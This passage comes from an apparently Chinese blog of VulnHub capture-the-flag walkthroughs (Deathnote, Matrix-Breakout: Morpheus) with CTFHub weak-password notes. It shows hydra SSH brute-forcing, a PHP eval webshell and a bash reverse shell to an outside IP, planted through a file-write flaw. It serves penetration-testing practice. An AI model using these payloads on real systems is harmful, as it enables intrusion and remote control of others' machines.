<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108204728050.png"><img src="/vulnhub/image-20221108204728050.png" alt="image-20221108204728050"></a></p>
<p>发现<code>kira</code>才是真正的后台用户，那么<code>ryuk</code>可能就是<code>ssh</code>的登录用户，那他的密码是多少呢</p>
<p>这个时候我想起他的留言</p>
<blockquote>
<p>my fav line is <code>iamjustic3</code></p>
<p>L on i will eliminate you L!</p>
</blockquote>
<p>他说他最喜欢的台词是<code>iamjustic3</code></p>
<p>既然是最喜欢的，那最有可能拿来当密码。所以这个可能就是<code>kira</code>的后台网站的登陆密码</p>
<h3 id="登录后台"><a href="#登录后台" class="headerlink" title="登录后台"></a>登录后台</h3><blockquote>
<p><code>kira</code><br><code>iamjustic3</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108205228054.png"><img src="/vulnhub/image-20221108205228054.png" alt="image-20221108205228054"></a></p>
<p>登录成功</p>
<p>这个页面提醒需要管理员邮箱验证，直接<code>remind me later</code>，我们先到后台看看</p>
<p>进来后台发现<code>comments</code>页面，先看看能不能看到<code>L</code>的评论</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108205526638.png"><img src="/vulnhub/image-20221108205526638.png" alt="image-20221108205526638"></a></p>
<p>发现同样啥也没有</p>
<h2 id="2-ssh登录-1"><a href="#2-ssh登录-1" class="headerlink" title="2.ssh登录"></a>2.ssh登录</h2><p>我们再看看其他页面</p>
<p>在<code>Media</code>页面</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211543340.png"><img src="/vulnhub/image-20221108211543340.png" alt="image-20221108211543340"></a></p>
<p>我们发现了<code>notes.txt</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211618643.png"><img src="/vulnhub/image-20221108211618643.png" alt="image-20221108211618643"></a></p>
<p>点开得到<code>notes.txt</code>文本的位置</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>deathnote.vuln<span class="regexp">/wordpress/</span>wp-content<span class="regexp">/uploads/</span><span class="number">2021</span><span class="regexp">/07/</span>notes.txt</span><br></pre></td></tr></table></figure>

<p>访问得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108211705028.png"><img src="/vulnhub/image-20221108211705028.png" alt="image-20221108211705028"></a></p>
<p>看起来很像密码本</p>
<blockquote>
<p><code>death4</code><br><code>death4life</code><br><code>death4u</code><br><code>death4ever</code><br><code>death4all</code><br><code>death420</code><br><code>death45</code><br><code>death4love</code><br><code>death49</code><br><code>death48</code><br><code>death456</code><br><code>death4014</code><br><code>1death4u</code><br><code>yaydeath44</code><br><code>thedeath4u2</code><br><code>thedeath4u</code><br><code>stickdeath420</code><br><code>reddeath44</code><br><code>megadeath44</code><br><code>megadeath4</code><br><code>killdeath405</code><br><code>hot2death4sho</code><br><code>death4south</code><br><code>death4now</code><br><code>death4l0ve</code><br><code>death4free</code><br><code>death4elmo</code><br><code>death4blood</code><br><code>death499Eyes301</code><br><code>death498</code><br><code>death4859</code><br><code>death47</code><br><code>death4545</code><br><code>death445</code><br><code>death444</code><br><code>death4387n</code><br><code>death4332387</code><br><code>death42521439</code><br><code>death42</code><br><code>death4138</code><br><code>death411</code><br><code>death405</code><br><code>death4me</code></p>
</blockquote>
<p>我们试试爆破<code>ssh</code></p>
<p>我们再弄个用户名本</p>
<blockquote>
<p>就拿我们已知的三个用户，做成用户名本<br><code>kira</code><br><code>l</code><br><code>ryku</code></p>
</blockquote>
<p>然后九头蛇爆破登录<code>ssh</code></p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">hydra</span> -L un.txt -P pass.txt <span class="number">192.168.163.123</span> ssh -s <span class="number">22</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108213915226.png"><img src="/vulnhub/image-20221108213915226.png" alt="image-20221108213915226"></a></p>
<p>发现登录用户【看来用不上去找那个<code>user.txt</code>】</p>
<blockquote>
<p><code>l</code><br><code>death4me</code></p>
</blockquote>
<p>然后我们试试登录</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ssh</span> l@<span class="number">192.168.16.123</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214049547.png"><img src="/vulnhub/image-20221108214049547.png" alt="image-20221108214049547"></a></p>
<p>登录成功，并看到当前目录下有个文本文件<code>user.txt</code>【无奈，现在找到应该也没啥用了】</p>
<p>查看一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214257074.png"><img src="/vulnhub/image-20221108214257074.png" alt="image-20221108214257074"></a></p>
<p>发现是串看不懂的文本</p>
<p>我们试试<code>ciphey</code>解密一下</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">ciphey</span> <span class="literal">-</span><span class="comment">t &quot;</span><span class="literal">++++++++++</span><span class="title">[</span>&gt;<span class="literal">+</span>&gt;<span class="literal">+++</span>&gt;<span class="literal">+++++++</span>&gt;<span class="literal">++++++++++</span>&lt;&lt;&lt;&lt;<span class="literal">-</span><span class="title">]</span>&gt;&gt;&gt;&gt;<span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="literal">++</span><span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">--------------</span><span class="string">.</span><span class="literal">++++++++</span><span class="string">.</span><span class="literal">+++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="string">.</span><span class="literal">------------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++++++++++++++</span><span class="string">.</span><span class="literal">-----------</span><span class="string">.</span><span class="literal">---</span><span class="string">.</span><span class="literal">+++++++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">++++++++++++</span><span class="string">.</span><span class="literal">------------</span><span class="string">.</span>&gt;&gt;<span class="literal">----------</span><span class="string">.</span><span class="literal">+++++++++++++++++++</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++</span><span class="string">.</span><span class="literal">----------</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">++</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span><span class="literal">-</span><span class="string">.</span><span class="literal">++++++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">------------------</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">+</span><span class="string">.</span><span class="literal">++++++++++</span><span class="string">.</span><span class="literal">-------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+++++++++++++++</span><span class="string">.</span><span class="literal">-----</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">----</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++</span><span class="string">.</span><span class="string">.</span>&lt;&lt;<span class="string">.</span>&gt;&gt;<span class="literal">+</span><span class="string">.</span><span class="literal">--------</span><span class="string">.</span>&lt;&lt;<span class="string">.</span><span class="literal">+++++++++++++</span><span class="string">.</span>&gt;&gt;<span class="literal">++++++</span><span class="string">.</span><span class="literal">--</span><span class="string">.</span><span class="literal">+++++++++</span><span class="string">.</span><span class="literal">-----------------</span><span class="string">.</span></span><br><span class="line"><span class="comment">&quot;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108221734407.png"><img src="/vulnhub/image-20221108221734407.png" alt="image-20221108221734407"></a></p>
<blockquote>
<p><code>i think u got the shell , but you wont be able to kill me -kira</code><br>意思是：<br>我想你已经拿到shell了，但你杀不了我-基拉</p>
</blockquote>
<p>感觉信息没啥用，但是大概猜测，杀死基拉是需要提权的，但是从L这里是无法提权，只有基拉才可以提权</p>
<p>我们可以试试我们能否以管理员身份执行一些命令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222201419.png"><img src="/vulnhub/image-20221108222201419.png" alt="image-20221108222201419"></a></p>
<p> 这样看来<code>L</code>是无法以管理员身份执行任何命令，那就只有看看有没有其他路径了</p>
<p>我们再输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">pwd</span></span><br></pre></td></tr></table></figure>

<p>看看我们当前路径</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214344792.png"><img src="/vulnhub/image-20221108214344792.png" alt="image-20221108214344792"></a></p>
<p>发现我们还有个上级目录，返回查看其下目录</p>
<p>居然还有个<code>kira</code>的目录</p>
<p>我们看看有什么</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214506480.png"><img src="/vulnhub/image-20221108214506480.png" alt="image-20221108214506480"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108214544456.png"><img src="/vulnhub/image-20221108214544456.png" alt="image-20221108214544456"></a></p>
<p>发现其目录下的<code>kira.txt</code>设置了权限</p>
<p>我们尝试用之前后台登录的密码登录，也失败了</p>
<h2 id="3-登录kira"><a href="#3-登录kira" class="headerlink" title="3.登录kira"></a>3.登录kira</h2><p>看来我们还需要找找信息，根据<code>user.txt</code>文本信息，我们必须要成功登录<code>kira</code>的用户，才可以提权拿到我们想要的东西</p>
<p>那我们直接搜索当前全部含有kira的文件或者目录</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;kira*&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222721847.png"><img src="/vulnhub/image-20221108222721847.png" alt="image-20221108222721847"></a></p>
<p>前两个前面访问过没权限</p>
<p>后面四个三个图片，最后一个也访问过，也没权限</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108222833431.png"><img src="/vulnhub/image-20221108222833431.png" alt="image-20221108222833431"></a></p>
<p>那就只有一个了</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/opt/L/kira-case</span><br></pre></td></tr></table></figure>

<p>我们查看一下有无信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223018151.png"><img src="/vulnhub/image-20221108223018151.png" alt="image-20221108223018151"></a></p>
<p>发现其为一个目录，且其下有一个文本文件</p>
<blockquote>
<p><code>the FBI agent died on December 27, 2006</code></p>
<p><code>1 week after the investigation of the task-force member/head.</code><br><code>aka.....</code><br><code>Soichiro Yagami&#39;s family .</code></p>
<p><code>hmmmmmmmmm......</code><br><code>and according to watari ,</code><br><code>he died as other died after Kira targeted them .</code></p>
<p><code>and we also found something in</code><br><code>fake-notebook-rule folder .</code><br>意思是：</p>
<p>联邦调查局特工于 2006 年 12 月 27 日去世</p>
<p>工作组成员&#x2F;负责人调查后 1 周。<br>又名……<br>八神宗一郎的家人。</p>
<p>嗯嗯嗯嗯……<br>根据 Watari 的说法，<br>在基拉瞄准他们之后，他死了，其他人也死了。</p>
<p>我们还发现了一些东西<br>假笔记本规则文件夹</p>
</blockquote>
<p>看来我们需要到<code>fake-notebook-rule</code>这个文件夹下寻找一番</p>
<figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="built_in">find</span> / -name <span class="string">&quot;fake-notebook-rule&quot;</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>

<p>找找位置</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223338919.png"><img src="/vulnhub/image-20221108223338919.png" alt="image-20221108223338919"></a></p>
<p>发现在</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/opt/L/fake-notebook-rule</span><br></pre></td></tr></table></figure>

<p>查看其下文件信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223431583.png"><img src="/vulnhub/image-20221108223431583.png" alt="image-20221108223431583"></a></p>
<p>大概意思看来就是让我们用<code>cyberchef</code>对<code>case.wav</code>的字符串解密【一眼<code>16</code>进制，直接手动解码算了】</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">63</span> <span class="number">47</span> <span class="number">46</span> <span class="number">7</span>a <span class="number">63</span> <span class="number">33</span> <span class="number">64</span> <span class="number">6</span>b <span class="number">49</span> <span class="number">44</span> <span class="number">6</span>f <span class="number">67</span> <span class="number">61</span> <span class="number">32</span> <span class="number">6</span>c <span class="number">79</span> <span class="number">59</span> <span class="number">57</span> <span class="number">6</span>c <span class="number">7</span>a <span class="number">5</span>a <span class="number">58</span> <span class="number">5</span>a <span class="number">70</span> <span class="number">62</span> <span class="number">43</span> <span class="number">41</span> <span class="number">3</span>d</span><br></pre></td></tr></table></figure>

<p>我们解码试试</p>
<p>解<code>16</code>进制</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223720859.png"><img src="/vulnhub/image-20221108223720859.png" alt="image-20221108223720859"></a></p>
<p>解码<code>base64</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223847293.png"><img src="/vulnhub/image-20221108223847293.png" alt="image-20221108223847293"></a></p>
<blockquote>
<p>passwd : <code>kiraisevil</code> </p>
</blockquote>
<p>得到<code>kira</code>密码</p>
<p>我们直接登录</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">su kira</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108223953100.png"><img src="/vulnhub/image-20221108223953100.png" alt="image-20221108223953100"></a></p>
<p> 登录成功</p>
<h2 id="4-提权-1"><a href="#4-提权-1" class="headerlink" title="4.提权"></a>4.提权</h2><p>我们先看看<code>kira</code>能以管理员身份执行哪些命令</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo -l</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224111044.png"><img src="/vulnhub/image-20221108224111044.png" alt="image-20221108224111044"></a></p>
<p>好家伙</p>
<figure class="highlight ada"><table><tr><td class="code"><pre><span class="line">(<span class="keyword">ALL</span> : <span class="type">ALL</span>) <span class="keyword">ALL</span></span><br></pre></td></tr></table></figure>

<p>代表他可以以管理员身份执行一切命令，那他就相当于管理员了</p>
<p>执行</p>
<figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">sudo su</span> </span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224357240.png"><img src="/vulnhub/image-20221108224357240.png" alt="image-20221108224357240"></a></p>
<p>直接无密码进入管理员用户</p>
<p>然后查看到根目录查看<code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224501582.png"><img src="/vulnhub/image-20221108224501582.png" alt="image-20221108224501582"></a></p>
<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line">      ::::::::       ::::::::       ::::    :::       ::::::::       :::::::::           :::    :::::::::::       :::::::: </span><br><span class="line">    :+:    :+:     :+:    :+:      :+:+:   :+:      :+:    :+:      :+:    :+:        :+: :+:      :+:          :+:    :+: </span><br><span class="line">   +:+            +:+    +:+      :+:+:+  +:+      +:+             +:+    +:+       +:+   +:+     +:+          +:+         </span><br><span class="line">  +#+            +#+    +:+      +#+ +:+ +#+      :#:             +#++:++#:       +#++:++#++:    +#+          +#++:++#++   </span><br><span class="line"> +#+            +#+    +#+      +#+  +#+#+#      +#+   +#+#      +#+    +#+      +#+     +#+    +#+                 +#+    </span><br><span class="line">#+#    #+#     #+#    #+#      #+#   #+#+#      #+#    #+#      #+#    #+#      #+#     #+#    #+#          #+#    #+#     </span><br><span class="line">########       ########       ###    ####       ########       ###    ###      ###     ###    ###           ########       </span><br><span class="line"></span><br><span class="line">##########follow me on twitter###########<span class="number">3</span></span><br><span class="line">and share this screen shot and tag @KDSAMF</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p><strong>游戏结束</strong></p>
<hr>
<h2 id="p-s-靶机彩蛋"><a href="#p-s-靶机彩蛋" class="headerlink" title="p.s.靶机彩蛋"></a>p.s.靶机彩蛋</h2><p>之前我们以<code>L</code>的身份查看<code>kira</code>，发现他底下有个<code>kira.txt</code>文本文件，我们无权访问</p>
<p>现在我们可以访问看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224728118.png"><img src="/vulnhub/image-20221108224728118.png" alt="image-20221108224728118"></a></p>
<p>发现是一串<code>base64</code>加码字符</p>
<p>解码看看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108224803164.png"><img src="/vulnhub/image-20221108224803164.png" alt="image-20221108224803164"></a></p>
<blockquote>
<p><code>please protect one of the following</code> </p>
<ol>
<li><p><code>L (/opt)</code></p>
</li>
<li><p><code>Misa (/var)</code></p>
</li>
</ol>
<p>  只能选其一来保护</p>
</blockquote>
<p><code>/opt</code>底下的<code>L</code>，我们已经看过了</p>
<p>我们看看<code>/var</code>下的<code>Misa</code>有什么</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221108225235107.png"><img src="/vulnhub/image-20221108225235107.png" alt="image-20221108225235107"></a></p>
<blockquote>
<p><code>it is toooo late for misa</code><br>#对米沙而言，已经太迟了</p>
</blockquote>
<p>感兴趣的朋友可以去看看<code>DEATH NOTE</code></p>
<hr>
<h1 id="二、MATRIX-BREAKOUT：2-MORPHEUS-中级"><a href="#二、MATRIX-BREAKOUT：2-MORPHEUS-中级" class="headerlink" title="二、MATRIX-BREAKOUT：2 MORPHEUS[中级]"></a>二、MATRIX-BREAKOUT：2 MORPHEUS[中级]</h1><p><strong>《矩阵突破》:2 墨菲斯</strong></p>
<blockquote>
<p>描述：<br><code>This is the second in the Matrix-Breakout series, subtitled Morpheus:1. It’s themed as a throwback to the first Matrix movie. You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out from, which holds the key to a mystery.</code><br><code>Difficulty: Medium-Hard</code></p>
<p>这是 Matrix-Breakout 系列中的第二部，副标题为 Morpheus:1。它的主题是回归第一部 Matrix 电影。您扮演 Trinity，试图调查 Nebuchadnezzar 上的一台计算机，Cypher 已将其他人拒之门外，而这台计算机掌握着解开谜团的钥匙。<br>难度：中等难度</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg"><img src="https://i0.wp.com/xnfood.com.tw/wp-content/uploads/20211012094553_22.jpeg" alt="懶人包》『駭客任務』系列電影回顧，1 ~ 4 集詳細劇情、心得 ..."></a></p>
<blockquote>
<p>wc确实有东西<br>实在不懂可以看这个研讨会视频<br><code>https://www.beyondtrust.com/webinars/attacking-and-defending-linux-breaking-out-of-the-matrix-edition#video-container</code><br>虽然这个不是这个靶机的wp，但是我还是从其中获得很多思路</p>
</blockquote>
<h2 id="信息收集-10"><a href="#信息收集-10" class="headerlink" title="信息收集"></a>信息收集</h2><p>先扫描一下端口</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117130716527.png"><img src="/vulnhub/image-20221117130716527.png" alt="image-20221117130716527"></a></p>
<blockquote>
<p>发现<code>22</code>端口开放，运行着<code>ssh</code><br><code>80，81</code>两个端口都运行着<code>http</code><br>但是两者名字不同，可以判断出<br>但是80端口可以任意访问，<code>81</code>端口访问需要一定权限</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117134302741.png"><img src="/vulnhub/image-20221117134302741.png" alt="image-20221117134302741"></a></p>
<blockquote>
<p>发现81端口是需要登录的</p>
</blockquote>
<p>然后<code>dirsearch</code>扫一下目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117130822881.png"><img src="/vulnhub/image-20221117130822881.png" alt="image-20221117130822881"></a></p>
<blockquote>
<p>发现网站目录下有爬虫协议，我们可以访问看看其中有没有关键信息</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131146601.png"><img src="/vulnhub/image-20221117131146601.png" alt="image-20221117131146601"></a></p>
<blockquote>
<p><code>There&#39;s no white rabbit here.  Keep searching!</code><br>意思是：这里没有白兔。继续搜索！ </p>
<p>#<code>white rabbit</code>就是爱丽丝梦游仙境里的，跟着白色的兔子，掉进兔子洞</p>
<p>看来是有个引导的信息，会带我们找到一个很关键的东西</p>
</blockquote>
<p>再用<code>whatweb</code>查看网站可显示的框架</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131950416.png"><img src="/vulnhub/image-20221117131950416.png" alt="image-20221117131950416"></a></p>
<p>没有啥信息</p>
<p>我们访问网站看看有没有其他信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221117131405964.png"><img src="/vulnhub/image-20221117131405964.png" alt="image-20221117131405964"></a></p>
<blockquote>
<p><code>Welcome to the Boot2Root CTF, Morpheus:1.</code></p>
<p><code>You play Trinity, trying to investigate a computer on the Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.</code></p>
<p><code>Good luck! - @jaybeale from @inguardians</code><br>意思是：<br>欢迎来到Boot2Root CTF，墨菲斯:1.</p>
<p>你扮演<code>Trinity</code>，试图调查尼布甲尼撒半岛上的一台电脑，<code>Cypher</code>把所有人都锁在外面，至少对于<code>ssh</code>。</p>
<p>祝你好运！ -@jaybealefrom@inguardians </p>
<p>#Cypher电影中反抗组织的一个叛徒，他把反抗组织锁在门外，我们又要用到ssh<br>那看来ssh登录的用户名为Cypher</p>
</blockquote>
<p>信息还是太少了，<code>dirsearch</code>只扫到两个可以访问，实在利用太少</p>
<p>所以我们换个扫描工具</p>
<h3 id="dirbuster"><a href="#dirbuster" class="headerlink" title="dirbuster"></a>dirbuster</h3><blockquote>
<p>DirBuster支持全部的Web目录扫描方式，用来探测web服务器上的目录和隐藏文件</p>
</blockquote>
<p>这里我利用的是</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/usr/</span>share<span class="regexp">/dirbuster/</span>wordlists/</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119232447671.png"><img src="/vulnhub/image-20221119232447671.png" alt="image-20221119232447671"></a></p>
<p>我通过<code>dirbuster</code>工具扫描到</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119232601421.png"><img src="/vulnhub/image-20221119232601421.png" alt="image-20221119232601421"></a></p>
<p>【看来dirsearch的目录太少了】</p>
<p>访问</p>
<figure class="highlight dts"><table><tr><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//192.168.80.131/graffiti.php</span></span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20221119234606473.png"><img src="/vulnhub/image-20221119234606473.png" alt="image-20221119234606473"></a></p>
<p>发现是个留言信息的一个网站</p>
<p>而且我们评论的信息被包含在了<code>graffiti.php</code>文件中</p>
<p>猜测是文件写入</p>
<p>于是抓包查看</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222151129426.png"><img src="/vulnhub/image-20230222151129426.png" alt="image-20230222151129426"></a></p>
<p>发现数据为</p>
<figure class="highlight cmake"><table><tr><td class="code"><pre><span class="line"><span class="keyword">message</span>=hello&amp;<span class="keyword">file</span>=graffiti.txt</span><br></pre></td></tr></table></figure>

<blockquote>
<p>message为写入信息</p>
<p>file为写入文件名称，而且还有后缀名字</p>
</blockquote>
<p>那么如果修改后面的文件名称，我们是不是可以实现文件上传的效果，上传一个包含木马的文件</p>
<h3 id="一句话🐎"><a href="#一句话🐎" class="headerlink" title="一句话🐎"></a>一句话🐎</h3><p>那就写一个一句话</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>然后再<code>url</code>编码</p>
<p>于是最后</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">message=%3C%3Fphp%20%40eval(%24_POST%5B<span class="string">&#x27;cmd&#x27;</span>%5D)%3B%20%3F%3E&amp;<span class="keyword">file</span>=hello.php</span><br></pre></td></tr></table></figure>

<p>如果你是开了火绒，那你可能会看到，刚发送就被火绒检测到网站存在一句话🐎，代表确实是可以的</p>
<p>用<code>nc</code>监听反弹<code>shell</code>也是一样</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">exec</span>(<span class="string">&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/172.22.204.2/1234 0&gt;&amp;1&#x27;&quot;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>得到</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">message</span>=%<span class="number">3</span>C%<span class="number">3</span>Fphp%<span class="number">20</span>exec(%<span class="number">22</span>%<span class="number">2</span>Fbin%<span class="number">2</span>Fbash%<span class="number">20</span>-c%<span class="number">20</span>&#x27;bash%<span class="number">20</span>-i%<span class="number">20</span>%<span class="number">3</span>E%<span class="number">26</span>%<span class="number">20</span>%<span class="number">2</span>Fdev%<span class="number">2</span>Ftcp%<span class="number">2</span>F<span class="number">172.22.204.2</span>%<span class="number">2</span>F1234%<span class="number">200</span>%<span class="number">3</span>E%<span class="number">261</span>&#x27;%<span class="number">22</span>)%<span class="number">3</span>B%<span class="number">20</span>%<span class="number">3</span>F%<span class="number">3</span>E&amp;file=hello.php</span><br></pre></td></tr></table></figure>



<p>访问<code>hello.php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152248020.png"><img src="/vulnhub/image-20230222152248020.png" alt="image-20230222152248020"></a></p>
<p>拿到<code>shell</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152313081.png"><img src="/vulnhub/image-20230222152313081.png" alt="image-20230222152313081"></a></p>
<h2 id="FLAG1"><a href="#FLAG1" class="headerlink" title="FLAG1"></a>FLAG1</h2><p>到根目录</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222152956576.png"><img src="/vulnhub/image-20230222152956576.png" alt="image-20230222152956576"></a></p>
<blockquote>
<p>Flag 1!</p>
<p>You’ve gotten onto the system.  Now why has Cypher locked everyone out of it?</p>
<p>Can you find a way to get Cypher’s password? It seems like he gave it to<br>Agent Smith, so Smith could figure out where to meet him.</p>
<p>Also, pull this image from the webserver on port 80 to get a flag.</p>
<p>&#x2F;.cypher-neo.png</p>
<p>标志1 !</p>
<p>你已经进入系统了。为什么塞弗把所有人都锁在外面?</p>
<p>你能想办法拿到塞弗的密码吗?看来他把它给了<br>史密斯探员，这样史密斯就能找到和他见面的地方。</p>
<p>另外，从端口80的web服务器上拉出这个图像来获得一个标志。&#x2F;.cypher-neo.png</p>
</blockquote>
<p>提示我们需要从网站上找到图片<code>.cypher-neo.png</code>，拿到其中的密码</p>
<p>直接wget</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222153353400.png"><img src="/vulnhub/image-20230222153353400.png" alt="image-20230222153353400"></a></p>
<h2 id="FLAG2"><a href="#FLAG2" class="headerlink" title="FLAG2"></a>FLAG2</h2><p><a data-fancybox="gallery" data-src="/vulnhub/image-20230222153942426.png"><img src="/vulnhub/image-20230222153942426.png" alt="image-20230222153942426"></a></p>
]]></content>
      <categories>
        <category>网络安全学习</category>
      </categories>
      <tags>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>CTFHub-wp</title>
    <url>/wp-CTFHub/</url>
    <content><![CDATA[<p><code>做做笔记</code></p>
<span id="more"></span>

<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="1-密码口令"><a href="#1-密码口令" class="headerlink" title="1.密码口令"></a>1.密码口令</h2><h3 id="1）弱口令"><a href="#1）弱口令" class="headerlink" title="1）弱口令"></a>1）弱口令</h3><p>一般思维，</p>
<p>用户名：admin，root</p>
<p>密码：password，admin123，123456</p>
<p>可以用<strong>top100字典</strong>（可以网上找一下）跑一下，但有的可能需要<strong>枚举法</strong></p>
<p>比如<strong>admin888</strong>或者<strong>admin255</strong>这样的类似的，就需要在后面用枚举法找出，字典并没包含这种类似情况</p>
<h3 id="2）默认口令"><a href="#2）默认口令" class="headerlink" title="2）默认口令"></a>2）默认口令</h3><p>就是系统默认的口令，在渗透测试过程中，最常见的情况就是遇到弱口令得到入口从而攻陷整个系统，由于很多系统管理员缺少安全意识，口令往往是系统默认设置的口令</p>
